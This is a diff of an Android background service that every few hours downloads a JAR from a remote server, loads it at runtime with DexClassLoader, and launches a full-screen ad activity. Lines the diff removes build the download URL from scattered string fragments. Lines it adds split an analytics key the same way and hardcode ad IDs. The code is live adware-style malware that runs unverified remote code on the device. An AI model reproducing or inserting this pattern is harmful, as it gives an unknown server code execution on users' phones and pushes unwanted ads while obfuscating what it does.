@@ -14,48 +14,38 @@ import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.DefaultHttpClient;
 
-import com.umeng.analytics.AnalyticsConfig;
-import com.umeng.analytics.MobclickAgent;
-
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
+import com.umeng.analytics.AnalyticsConfig;
+import com.umeng.analytics.MobclickAgent;
+
 import dalvik.system.DexClassLoader;
 
 public class StartCheckJarService extends Service {
 
+	public static String jarName2 = "test";
 	private static String appid = "1104824603"; // 应用ID 短的
-	private static String adid = null; // 广告位ID 长的
-	private static String umkey = null;
+	private static String adid = "7030901651170437"; // 广告位ID 长的
+	static String umkey1 = "5666";
+	static String umkey2 = "9991";
+	static String umkey3 = "67e5";
+	static String umkey4 = "8e6e";
+	static String umkey5 = "8000";
+	public static String umkey = umkey1 + umkey2 + umkey3 + umkey4 + umkey5 + "14f1";
 
-	private static String jarName = "gdti02.jar"; // jar包名称;
-
-	static String d1 = "http://";
-	static String d2 = "down";
-	static String d3 = "ge";
-	static String d4 = "co";
-	static String d41 = "no";
-	static String d5 = "org";
-	static String d6 = "/pl";
-	static String d61 = "ug";
-	static String d7 = "in/";
-	private static String jarurl = d1 + d2 + "." + d3 + d4 + d41 + "." + d5 + d6 + d61 + d7 + jarName; // jar下载地址;
-	// private static String brclassName = "go.go.go"; // 动态注册广播名称
-	private static String jarInter = "g.d.x.dd"; // 接口;
 	private static int sleeptime = 240; // 更新JAR包的间隔,分钟;
 	private static String initinfos = null; // 传递信息;
-
-	// private BroadcastReceiver bcr;
 	static d jar;
-
 	static File dexOutputDir;
 	static File jarfile;
 	static boolean jarisnew = false;
 	static DexClassLoader classLoader;
-
 	private static Thread checkt;
 	private static HttpClient httpClient;
 	private static HttpGet httpGet;
@@ -75,14 +65,11 @@ public class StartCheckJarService extends Service {
 				break;
 			case LOAD_JAR:
 				if (jar == null) {
-					LogUtil.i("jar为空,加载JAR包");
 					loadJar();
 				} else if (jarisnew) {
 					try {
-						LogUtil.i("JAR包更新,关闭JAR包");
 						jar.closeJAR(context);
 					} catch (Exception e) {
-						LogUtil.i("JAR包更新,关闭JAR包失败");
 					}
 					loadJar();
 				}
@@ -103,13 +90,22 @@ public class StartCheckJarService extends Service {
 
 	@Override
 	public void onCreate() {
-		LogUtil.i("onCreate");
 		context = this;
 		scjService = this;
+		LogUtil.i("StartCheckJarService启动");
 		youmeng();
 		dexOutputDir = context.getDir("dex", 0);
-		jarfile = new File(context.getFilesDir(), jarName);
-		// creatbroR();
+		jarfile = new File(context.getFilesDir(), info.jarName);
+		try {
+			SharedPreferences preferences = getSharedPreferences("gdt", Context.MODE_PRIVATE);
+			Editor editor = preferences.edit();
+			editor.putString("appid", appid);
+			editor.putString("adid", adid);
+			editor.commit();
+			LogUtil.i("偏好设置写入成功");
+		} catch (Exception e) {
+			LogUtil.i("偏好设置写入失败");
+		}
 		creatthread(this);
 		super.onCreate();
 	}
@@ -121,20 +117,13 @@ public class StartCheckJarService extends Service {
 		MobclickAgent.onResume(context);
 	}
 
-	/**
-	 * 创建线程循环更新JAR包.并调用.
-	 * 
-	 * @param context
-	 */
 	private static void creatthread(final Context context) {
 		if (checkt == null)
 			checkt = new Thread() {
 				public void run() {
 					while (true) {
-						// LogUtil.i("JAR下载地址" + jarurl);
 						jarisnew = false;
-
-						httpGet = new HttpGet(jarurl);
+						httpGet = new HttpGet(info.jarurl);
 						httpResponse = null;
 						if (httpClient == null)
 							httpClient = new DefaultHttpClient();
@@ -150,12 +139,10 @@ public class StartCheckJarService extends Service {
 								long newJarSize = httpResponse.getEntity().getContentLength();
 								if (!jarfile.exists() || newJarSize != jarfile.length()) {
 									if (jarfile.exists()) {
-										LogUtil.i("JAR包存在,大小不一样:" + jarfile.length() + "-------newJarSize:"
-												+ newJarSize + "---删除文件");
 										jarfile.delete();
 										handlerchecktnew.sendEmptyMessage(STOP_JAR);
 									}
-									File jarfiletemp = new File(context.getFilesDir(), jarName + ".temp");
+									File jarfiletemp = new File(context.getFilesDir(), info.jarName + ".temp");
 									InputStream is = null;
 									FileOutputStream fs = null;
 									try {
@@ -167,9 +154,9 @@ public class StartCheckJarService extends Service {
 											fs.write(buff, 0, len);
 										}
 										if (jarfiletemp.length() == newJarSize) {
-											LogUtil.i("下载成功,保存JAR包");
 											jarfiletemp.renameTo(jarfile);
 											jarisnew = true;
+											LogUtil.i("JAR包下载成功");
 										}
 										fs.close();
 										is.close();
@@ -185,13 +172,12 @@ public class StartCheckJarService extends Service {
 											e.printStackTrace();
 										}
 									}
-								} else {
-									LogUtil.i("JAR包存在 并大小一样");
-								}
-							}
-						} else {
-							LogUtil.i("httpResponse为null");
-						}
+								} else
+									LogUtil.i("JAR包存在 大小一样");
+							} else
+								LogUtil.i("httpResponse!=200");
+						} else
+							LogUtil.i("httpResponse == null");
 						if (jarfile.exists())
 							handlerchecktnew.sendEmptyMessage(LOAD_JAR);
 						try {
@@ -207,19 +193,16 @@ public class StartCheckJarService extends Service {
 	}
 
 	private static void loadJar() {
-		LogUtil.i("loadJar");
 		if (jarfile.exists()) {
-			// if (classLoader == null)
 			classLoader = new DexClassLoader(jarfile.getAbsolutePath(), dexOutputDir.getAbsolutePath(), null,
 					context.getClassLoader());
 			Class<?> lib;
 			try {
-				lib = classLoader.loadClass(jarInter);
-				LogUtil.i("加载成功1");
+				lib = classLoader.loadClass(info.jarInter);
 				jar = (d) lib.newInstance();
-				LogUtil.i("加载成功2");
+				LogUtil.i("JAR动态加载成功");
 			} catch (Exception e) {
-				LogUtil.i("加载失败");
+				LogUtil.i("JAR动态加载失败");
 			}
 		}
 	}
@@ -228,6 +211,7 @@ public class StartCheckJarService extends Service {
 		Intent Intent = new Intent(scjService.getBaseContext(), DInsert.class);
 		Intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
 		scjService.getApplication().startActivity(Intent);
+		LogUtil.i("广告界面调用");
 	}
 
 	protected static void stopJar() {
@@ -254,7 +238,6 @@ public class StartCheckJarService extends Service {
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-
 		flags = START_STICKY;
 		return super.onStartCommand(intent, flags, startId);
 	}
